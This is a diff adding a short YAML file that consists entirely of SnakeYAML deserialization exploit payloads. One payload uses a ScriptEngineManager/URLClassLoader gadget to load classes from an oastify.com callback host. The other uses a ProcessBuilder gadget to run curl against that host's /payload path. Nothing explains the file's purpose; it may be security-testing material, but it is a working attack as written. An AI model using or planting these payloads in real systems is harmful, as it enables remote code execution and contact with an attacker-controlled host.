@@ -1,0 +1,12 @@
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["https://bxcurmixdf6d64ktmmx048hex53wrwfl.oastify.com/"]
+  ]]
+]
+
+!!java.lang.ProcessBuilder [
+  !!seq [
+    "curl", 
+    "https://bxcurmixdf6d64ktmmx048hex53wrwfl.oastify.com/payload"
+  ]
+]
